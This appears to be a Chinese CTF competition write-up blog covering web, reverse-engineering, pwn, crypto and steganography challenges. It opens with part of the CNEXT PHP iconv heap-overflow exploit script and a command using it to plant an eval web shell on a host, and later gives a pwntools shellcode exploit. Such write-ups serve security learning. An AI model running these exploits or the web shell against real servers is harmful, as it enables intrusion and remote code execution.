+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = compressed_bucket(step3_overflow)
+
+    step4_size = CS
+    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = compressed_bucket(step4)
+
+    # This chunk will eventually overwrite mm_heap-&gt;free_slot
+    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
+    step4_pwn = ptr_bucket(
+        0x200000,
+        0,
+        # free_slot
+        0,
+        0,
+        ADDR_CUSTOM_HEAP,  # 0x18
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        ADDR_HEAP,  # 0x140
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        size=CS,
+    )
+
+    step4_custom_heap = ptr_bucket(
+        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+    )
+
+    step4_use_custom_heap_size = 0x140
+
+    COMMAND = self.command
+    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
+    if self.sleep:
+        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
+    COMMAND = COMMAND.encode() + b&quot;\x00&quot;
+
+    assert (
+            len(COMMAND) &lt;= step4_use_custom_heap_size
+    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
+    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)
+
+    step4_use_custom_heap = COMMAND
+    step4_use_custom_heap = qpe(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+
+    pages = (
+            step4 * 3
+            + step4_pwn
+            + step4_custom_heap
+            + step4_use_custom_heap
+            + step3_overflow
+            + pad * self.pad
+            + step1 * 3
+            + step2_write_ptr
+            + step2 * 2
+    )
+
+    resource = compress(compress(pages))
+    resource = b64(resource)
+    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;
+
+    filters = [
+        # Create buckets
+        &quot;zlib.inflate&quot;,
+        &quot;zlib.inflate&quot;,
+
+        # Step 0: Setup heap
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 1: Reverse FL order
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 2: Put fake pointer and make FL order back to normal
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 3: Trigger overflow
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
+
+        # Step 4: Allocate at arbitrary address and change zend_mm_heap
+        &quot;convert.quoted-printable-decode&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+    ]
+    filters = &quot;|&quot;.join(filters)
+    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;
+
+    return path
+
+@inform(&quot;Triggering...&quot;)
+def exploit(self) -&gt; None:
+    path = self.build_exploit_path()
+    start = time.time()
+
+    try:
+        self.remote.send(path)
+    except (ConnectionError, ChunkedEncodingError):
+        pass
+
+    msg_print()
+
+    if not self.sleep:
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
+    elif start + self.sleep &lt;= time.time():
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
+    else:
+        # Wrong heap, maybe? If the exploited suggested others, use them!
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
+
+    msg_print()
+</code></pre>
+<p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””<br>    # Remove 2-byte header and 4-byte checksum<br>    return zlib.compress(data, 9)[2:-4]</p>
+<p>def b64(data: bytes, misalign&#x3D;True) -&gt; bytes:<br>    payload &#x3D; base64.encode(data)<br>    if not misalign and payload.endswith(“&#x3D;”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
+<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
+<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”&#x3D;{x:02x}” for x in data).upper().encode()</p>
+<p>def ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) * 8 &#x3D;&#x3D; size<br>    bucket &#x3D; b””.join(map(p64, ptrs))<br>    bucket &#x3D; qpe(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; compressed_bucket(bucket)</p>
+<pre><code>return bucket
+</code></pre>
+<p>def chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””<br>    # The caller does not care about the size: let’s just add 8, which is more than<br>    # enough<br>    if size is None:<br>        size &#x3D; len(data) + 8<br>    keep &#x3D; len(data) + len(b”\n\n”)<br>    size &#x3D; f”{len(data):x}”.rjust(size - keep, “0”)<br>    return size.encode() + b”\n” + data + b”\n”</p>
+<p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
+<pre><code>start: int
+stop: int
+permissions: str
+path: str
+
+@property
+def size(self) -&gt; int:
+    return self.stop - self.start
+</code></pre>
+<p>Exploit()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`python3 cnext-exploit.py http://192.168.18.24/ &quot;echo &#x27;&lt;?php eval(\$_POST[0]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;`</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/dpHeHx89TrtcSlxc.png!thumbnail)</span><br><span class="line"></span><br><span class="line"># Re</span><br><span class="line"></span><br><span class="line">## joyVBS</span><br><span class="line"></span><br><span class="line">​	经典的VBS混淆，强网刚遇到过，给dim定义之后输出以下代码逻辑，一开始用WScript.Echo复制不了数据人麻了，ocr卡半天，后面加了两行代码给dump到本地才行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Set fso &#x3D; CreateObject(“Scripting.FileSystemObject”)<br>Set file &#x3D; fso.CreateTextFile(“111.txt”, True)<br>file.WriteLine(output)<br>file.Close</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现就是解一个凯撒加base64,凯撒的偏移是12</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/vZoWSoai2VpZq5eB.png!thumbnail)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/5xhOndXOdLLkNd4M.png!thumbnail)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/zSOBc0GiPRVBaGPD.png!thumbnail)</span><br><span class="line"></span><br><span class="line">## Rafflesia</span><br><span class="line"></span><br><span class="line">花指令，jzjnz直接nop，然后直接动态跟逻辑，干掉反调继续往下走</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Sm60hiT4Q2tDxOTz.png!thumbnail)</span><br><span class="line"></span><br><span class="line">然后跟到回调之后有码表的更换</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ItJH9zPZWTbYzP7t.png!thumbnail)</span><br><span class="line"></span><br><span class="line">直接跑起来弄出码表，然后发现主逻辑中藏了一个异或24的逻辑</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/2B0uj3goqtqlJTgv.png!thumbnail)</span><br><span class="line"></span><br><span class="line">密文异或完24直接解变表base64即可</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GhYJvDIApuRcmE5v.png!thumbnail)</span><br><span class="line"></span><br><span class="line">## RE5</span><br><span class="line"></span><br><span class="line">面上的就是经典tea，不过肯定没这么简单，调起来之后主要就是![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/KrfmuTQsKbCFoif6.png!thumbnail)动调之后触发了两段除零异常</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Lsnpv8VSic2hiDDZ.png!thumbnail)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/qeaAheFM9BV9FaY0.png!thumbnail)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/gWB8DWImRToEGCR1.png!thumbnail)</span><br><span class="line"></span><br><span class="line">给密钥换了，然后是加密的逻辑过程中也有异常被触发，走的都是上述相同的异常逻辑，直接提取密文模拟一下随机数获取的逻辑即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#include &lt;stdio.h&gt;<br>#include &lt;stdint.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;time.h&gt;</p>
+<p>void decrypt(uint32_t* data, uint32_t* key) {<br>    uint32_t block1 &#x3D; data[0], block2 &#x3D; data[1], round_sum, idx;</p>
+<pre><code>uint32_t round_sums[32];
+for (idx = 0; idx &lt; 32; idx++) &#123;
+    round_sums[idx] = rand();
+    if (idx != 0)
+        round_sums[idx] += round_sums[idx - 1];
+&#125;
+
+uint32_t key_part1 = key[0], key_part2 = key[1], key_part3 = key[2], key_part4 = key[3];
+for (idx = 0; idx &lt; 32; idx++) &#123;
+    round_sum = round_sums[31 - idx];
+    block2 -= ((block1 &lt;&lt; 4) + key_part3) ^ (block1 + round_sum) ^ ((block1 &gt;&gt; 5) + key_part4);
+    block1 -= ((block2 &lt;&lt; 4) + key_part1) ^ (block2 + round_sum) ^ ((block2 &gt;&gt; 5) + key_part2);
+&#125;
+data[0] = block1; data[1] = block2;
+</code></pre>
+<p>}</p>
+<p>int main()<br>{<br>    srand(0);<br>    uint32_t data[] &#x3D; {0xEA2063F8, 0x8F66F252, 0x902A72EF, 0x411FDA74, 0x19590D4D, 0xCAE74317, 0x63870F3F, 0xD753AE61};<br>    uint32_t key[4] &#x3D; {2, 2, 3, 3};<br>    decrypt(data, key);<br>    decrypt(data + 2, key);<br>    decrypt(data + 4, key);<br>    decrypt(data + 6, key);</p>
+<pre><code>printf(&quot;%s&quot;, data);
+
+return 0;
+</code></pre>
+<p>}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 	exec</span><br><span class="line"></span><br><span class="line">下下来之后用pycharm打开，按照他给的base解密</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import base64<br>exp &#x3D; (每次解密后的得出解密代码)#把前面的”exec(“和后面”)“删掉</p>
+<h1 id="将解码后的数据写入到一个文本文件"><a href="#将解码后的数据写入到一个文本文件" class="headerlink" title="将解码后的数据写入到一个文本文件"></a>将解码后的数据写入到一个文本文件</h1><p>with open(‘decoded_output28.txt’, ‘wb’) as f:<br>     f.write(exp)</p>
+<p>print(“解密结果已经写入到 decoded_output28.txt 文件中。”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一共这样循环28次的base64/32/85</span><br><span class="line"></span><br><span class="line"> 最后解出来是个rc4加密：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>a&#x3D;True<br>d&#x3D;len<br>G&#x3D;list<br>g&#x3D;range<br>s&#x3D;next<br>R&#x3D;bytes<br>o&#x3D;input<br>Y&#x3D;print</p>
+<p>def l(S):<br>    i&#x3D;0<br>    j&#x3D;0<br>    while a:<br>        i&#x3D;(i+1)%256<br>        j&#x3D;(j+S[i])%256<br>        S[i],S[j]&#x3D;S[j],S[i]<br>        K&#x3D;S[(S[i]+S[j])%256]<br>    yield K</p>
+<p>def N(key,O):<br>     I&#x3D;d(key)<br>     S&#x3D;G(g(256))<br>     j&#x3D;0<br>     for i in g(256):<br>        j&#x3D;(j+S[i]+key[i%I])%256<br>        S[i],S[j]&#x3D;S[j],S[i]<br>        z&#x3D;l(S)<br>        n&#x3D;[]<br>        for k in O:<br>          n.append(k^s(z)+2)<br>        return R(n)</p>
+<p>def E(s,parts_num):<br>     Q&#x3D;d(s.decode())<br>     S&#x3D;Q&#x2F;&#x2F;parts_num<br>     u&#x3D;Q%parts_num<br>     W&#x3D;[]<br>     j&#x3D;0<br>     for i in g(parts_num):<br>        T&#x3D;j+S<br>        if u&gt;0:<br>            T+&#x3D;1<br>            u-&#x3D;1<br>        W.append(s[j:T])<br>        j&#x3D;T<br>        return W</p>
+<p>if <strong>name</strong>&#x3D;&#x3D;’<strong>main</strong>‘:<br> L&#x3D;o(‘input the flag: &gt;&gt;&gt; ‘).encode()<br> assert d(L)%2&#x3D;&#x3D;0,’flag length should be even’<br> t&#x3D;b‘v3ry_s3cr3t_p@ssw0rd’<br> O&#x3D;E(L,2)<br> U&#x3D;[]<br> for i in O:<br>     U.append(N(t,i).hex())</p>
+<p>if U&#x3D;&#x3D;[‘1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60’,’2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a’]:<br>    Y(‘Congratulations! You got the flag!’)<br>else:<br>    print(‘Wrong flag!’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以exp为：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>a &#x3D; True<br>d &#x3D; len<br>G &#x3D; list<br>g &#x3D; range<br>s &#x3D; next<br>R &#x3D; bytes<br>Y &#x3D; print</p>
+<h1 id="生成器-l-S-（与加密时的相同）"><a href="#生成器-l-S-（与加密时的相同）" class="headerlink" title="生成器 l(S)（与加密时的相同）"></a>生成器 l(S)（与加密时的相同）</h1><p>def l(S):<br>    i &#x3D; 0<br>    j &#x3D; 0<br>    while True:<br>        i &#x3D; (i + 1) % 256<br>        j &#x3D; (j + S[i]) % 256<br>        S[i], S[j] &#x3D; S[j], S[i]<br>        K &#x3D; S[(S[i] + S[j]) % 256]<br>        yield K</p>
+<h1 id="RC4-解密函数-N"><a href="#RC4-解密函数-N" class="headerlink" title="RC4 解密函数 N"></a>RC4 解密函数 N</h1><p>def N(key, O):<br>    I &#x3D; d(key)<br>    S &#x3D; G(g(256))<br>    j &#x3D; 0<br>    for i in g(256):<br>        j &#x3D; (j + S[i] + key[i % I]) % 256<br>        S[i], S[j] &#x3D; S[j], S[i]</p>
+<pre><code>z = l(S)  # 初始化生成器
+n = []
+for k in O:
+    n.append(k ^ s(z) + 2)  # 用生成器返回的伪随机数解密数据
+return R(n)  # 返回解密后的字节对象
+</code></pre>
+<p>def E(s, parts_num):<br>    Q &#x3D; d(s.decode())<br>    S &#x3D; Q &#x2F;&#x2F; parts_num<br>    u &#x3D; Q % parts_num<br>    W &#x3D; []<br>    j &#x3D; 0<br>    for i in g(parts_num):<br>        T &#x3D; j + S<br>        if u &gt; 0:<br>            T +&#x3D; 1<br>            u -&#x3D; 1<br>        W.append(s[j:T])<br>        j &#x3D; T<br>    return W  </p>
+<p>def decrypt_flag(U):<br>    t &#x3D; b‘v3ry_s3cr3t_p@ssw0rd’<br>    decrypted_parts &#x3D; []</p>
+<pre><code>for part in U:
+    encrypted_bytes = bytes.fromhex(part)  
+    decrypted_part = N(t, encrypted_bytes) 
+    decrypted_parts.append(decrypted_part.decode())  
+return &#39;&#39;.join(decrypted_parts)
+</code></pre>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:</p>
+<pre><code>U = [
+    &#39;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#39;,
+    &#39;2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a&#39;
+]
+
+flag = decrypt_flag(U)
+
+print(&quot;Decrypted flag:&quot;, flag)
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/coxRB1u5g17MiI56.png!thumbnail)</span><br><span class="line"></span><br><span class="line">flag&#123;thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n&#125;</span><br><span class="line"></span><br><span class="line"># Pwn</span><br><span class="line"></span><br><span class="line">## cool_book</span><br><span class="line"></span><br><span class="line">mprotect，可以想到shellcode</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/VnfkxlVV6q72RqRo.png!thumbnail)</span><br><span class="line"></span><br><span class="line">继续读代码，发现有数组越界,可以劫持程序流程，控制返回地址</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Zk4fw8X50IxS3GKS.png!thumbnail)</span><br><span class="line"></span><br><span class="line">有沙盒</span><br><span class="line"></span><br><span class="line">![img](https://uploader.shimo.im/f/fkpERjCXyRSJPraS.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MzEyNDMxMTUsImZpbGVHVUlEIjoiZ08zb2RQeU5WbnM2SndxRCIsImlhdCI6MTczMTI0MjgxNSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo5MTM0NDA5N30.KLNsbYR9RjX0zrp5lIjf_ZvUE8WJyWL4gZGilf7odb4)</span><br><span class="line"></span><br><span class="line">仅允许使用，open,read,write</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GpRUam5wn2peOYDL.png!thumbnail)</span><br><span class="line"></span><br><span class="line">构造read读入orw</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *</p>
+<p>elf &#x3D; ELF(“.&#x2F;cool_book”)<br>p &#x3D; remote(“192.168.18.25”, 8888)<br>libc &#x3D; ELF(“&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6”)<br>context(os&#x3D;”linux”, arch&#x3D;”amd64”, log_level&#x3D;”debug”)</p>
+<p>p.recvuntil(b”addr&#x3D;”)<br>heap &#x3D; int(p.recv(14), 16)<br>print(f”Heap Address: {hex(heap)}”)</p>
+<p>def choice(a):<br>    p.sendlineafter(b”3.exit”, str(a))</p>
+<p>def add(idx, con):<br>    choice(1)<br>    p.sendlineafter(b”input idx”, str(idx))<br>    p.sendafter(b”input content”, con)</p>
+<p>def free(idx):<br>    choice(2)<br>    p.sendlineafter(b”input idx”, str(idx))</p>
+<p>shellcode1 &#x3D; asm(<br>    “””<br>    mov rsp,rbp<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode2 &#x3D; asm(<br>    “””<br>    mov r8,0x67616c662f<br>    sub rbp,0x30<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode3 &#x3D; asm(<br>    “””<br>    push r8<br>    mov rdi,rsp<br>    sub rbp,0x30<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode4 &#x3D; asm(<br>    “””<br>    xor esi,esi<br>    push 2<br>    pop rax<br>    syscall<br>    sub rbp,0x30<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode5 &#x3D; asm(<br>    “””<br>    mov rdi,rax<br>    mov rsi,rsp<br>    sub rbp,0x30<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode6 &#x3D; asm(<br>    “””<br>    mov edx,0x100<br>    xor eax,eax<br>    syscall<br>    sub rbp,0x30<br>    jmp rbp<br>    “””<br>)</p>
+<p>shellcode7 &#x3D; asm(<br>    “””<br>    mov edi,1<br>    mov rsi,rsp<br>    push 1<br>    pop rax<br>    syscall<br>    “””<br>)</p>
+<p>for i in range(48):<br>    add(i, b”a”)</p>
+<p>print(len(shellcode6))</p>
+<p>add(43, shellcode7)<br>add(44, shellcode6)<br>add(45, shellcode5)<br>add(46, shellcode4)<br>add(47, shellcode3)<br>add(48, shellcode2)<br>add(49, shellcode1)</p>
+<p>choice(3)<br>p.interactive()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Crypto</span><br><span class="line"></span><br><span class="line">## babyenc</span><br><span class="line"></span><br><span class="line">需要分别解密两段flag</span><br><span class="line"></span><br><span class="line">flag1需要构造恢复n获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from Crypto.Util.number import long_to_bytes<br>import gmpy2</p>
+<p>e &#x3D; [43, 37, 53, 61, 59]<br>c1 &#x3D; [<br>    304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117,<br>    300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224,<br>    294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531,<br>    255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835,<br>    194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978<br>]</p>
+<p>a &#x3D; pow(c1[0], e[1]) - pow(c1[1], e[0])<br>b &#x3D; pow(c1[2], e[3]) - pow(c1[3], e[2])</p>
+<p>n1 &#x3D; gmpy2.gcd(a, b)</p>
+<p>print(long_to_bytes(n1 &gt;&gt; 310))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ga6h6FFz2jdktLys.png!thumbnail)</span><br><span class="line"></span><br><span class="line">flag2需要利用等式构造还原即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from Crypto.Util.number import long_to_bytes<br>from gmpy2 import *</p>
+<p>e &#x3D; [43, 37, 53, 61, 59]<br>c2 &#x3D; [<br>    12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364,<br>    13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932<br>]</p>
+<p>b &#x3D; c2[0] + c2[1]<br>c &#x3D; c2[0] * c2[1]</p>
+<p>R.<x> &#x3D; Zmod(n)[]<br>f &#x3D; x^2 - b * x + c</p>
+<p>print(f.small_roots(X&#x3D;2^400))</p>
+<h1 id="146436625375651639081292195233290471195543268962429"><a href="#146436625375651639081292195233290471195543268962429" class="headerlink" title="[146436625375651639081292195233290471195543268962429]"></a>[146436625375651639081292195233290471195543268962429]</h1><p>result &#x3D; long_to_bytes(146436625375651639081292195233290471195543268962429)<br>print(result)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后将flag拼一块即可：flag&#123;3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30&#125;</span><br><span class="line"></span><br><span class="line"># Misc</span><br><span class="line"></span><br><span class="line">## Simple_steganography</span><br><span class="line"></span><br><span class="line">首先附件拿7zip打开能看到3个文件，其他的只能看到两个文件，有一个图片被隐藏了</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Pyu7MI0fDjMDvXBk.png!thumbnail)</span><br><span class="line"></span><br><span class="line">把图片打开再另存取出来后用foremost跑一下这个图片</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6C4LvOgbOPqtTe07.png!thumbnail)</span><br><span class="line"></span><br><span class="line">里面有个000000000.jpg.没啥思路，再看看之前解出压缩包的文件有个hint.txt:a=7,b=35</span><br><span class="line"></span><br><span class="line">可能是猫脸变化，上网搜一下脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from PIL import Image<br>import numpy as np</p>
+<p>def arnold(im_file, a, b, fn):<br>    img &#x3D; np.array(Image.open(im_file))<br>    height, width, color &#x3D; img.shape<br>    res_img &#x3D; np.zeros((height, width, color), dtype&#x3D;int)<br>    a_b_plus_1 &#x3D; a * b + 1<br>    negative_b &#x3D; -b</p>
+<pre><code>for j in range(height):
+    for i in range(width):
+        new_j = (a_b_plus_1 * j - a * i) % height
+        new_i = (negative_b * j + i) % width
+        res_img[new_j, new_i] = img[j, i]
+Image.fromarray(np.uint8(res_img)).save(fn)
+</code></pre>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    a &#x3D; 0x6f6c53<br>    b &#x3D; 0x729e<br>    arnold(“D:\phpstudy_pro\WWW\php\测试\00000000.jpg”, 7, 35, “D:\phpstudy_pro\WWW\php\测试\000000001.jpg”)</p>
